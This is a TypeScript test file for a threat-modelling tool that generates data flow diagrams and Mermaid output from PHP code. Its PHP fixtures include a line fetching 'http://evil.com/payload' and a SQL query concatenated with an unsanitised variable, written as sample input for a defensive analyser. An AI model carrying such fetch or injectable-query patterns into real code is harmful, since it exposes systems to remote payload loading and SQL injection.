import { describe, it, expect } from 'bun:test';
import { generateDfd, dfdToMermaid } from '../../src/threatmodel/dfd';
import { writeFileSync, mkdtempSync, rmSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

describe('DFD generator', () => {
  it('identifies HTTP input as external entity', () => {
    const dir = mkdtempSync(join(tmpdir(), 'dfd-test-'));
    try {
      const f = join(dir, 'a.php');
      writeFileSync(f, '<?php\n$x = $_GET["id"];\n');
      const dfd = generateDfd('/target', [f]);
      const eeNodes = dfd.nodes.filter(n => n.type === 'EE' && n.label === 'HTTP user input');
      expect(eeNodes.length).toBeGreaterThan(0);
    } finally { rmSync(dir, { recursive: true }); }
  });

  it('identifies DB queries as data store', () => {
    const dir = mkdtempSync(join(tmpdir(), 'dfd-test-'));
    try {
      const f = join(dir, 'a.php');
      writeFileSync(f, '<?php\nmysql_query("SELECT * FROM users WHERE id=" . $id);\n');
      const dfd = generateDfd('/target', [f]);
      const dsNodes = dfd.nodes.filter(n => n.type === 'DS');
      expect(dsNodes.length).toBeGreaterThan(0);
    } finally { rmSync(dir, { recursive: true }); }
  });

  it('identifies external HTTP calls', () => {
    const dir = mkdtempSync(join(tmpdir(), 'dfd-test-'));
    try {
      const f = join(dir, 'a.php');
      writeFileSync(f, '<?php\n$x = file_get_contents("http://evil.com/payload");\n');
      const dfd = generateDfd('/target', [f]);
      const extNodes = dfd.nodes.filter(n => n.type === 'EE' && n.label === 'External HTTP');
      expect(extNodes.length).toBeGreaterThan(0);
    } finally { rmSync(dir, { recursive: true }); }
  });

  it('builds 3 trust boundaries', () => {
    const dir = mkdtempSync(join(tmpdir(), 'dfd-test-'));
    try {
      const f = join(dir, 'a.php');
      writeFileSync(f, '<?php\nfunction f() { return $_GET["x"]; }\nmysql_query("SELECT 1");\n');
      const dfd = generateDfd('/target', [f]);
      expect(dfd.boundaries.length).toBe(3);
      expect(dfd.boundaries.map(b => b.label)).toContain('Public internet (untrusted)');
      expect(dfd.boundaries.map(b => b.label)).toContain('Application tier');
      expect(dfd.boundaries.map(b => b.label)).toContain('Data tier');
    } finally { rmSync(dir, { recursive: true }); }
  });

  it('produces valid Mermaid diagram', () => {
    const dir = mkdtempSync(join(tmpdir(), 'dfd-test-'));
    try {
      const f = join(dir, 'a.php');
      writeFileSync(f, '<?php\n$x = $_GET["x"];\nfunction handler() { return $x; }\n');
      const dfd = generateDfd('/target', [f]);
      const mermaid = dfdToMermaid(dfd);
      expect(mermaid).toContain('```mermaid');
      expect(mermaid).toContain('flowchart LR');
      expect(mermaid).toContain('subgraph');
    } finally { rmSync(dir, { recursive: true }); }
  });
});
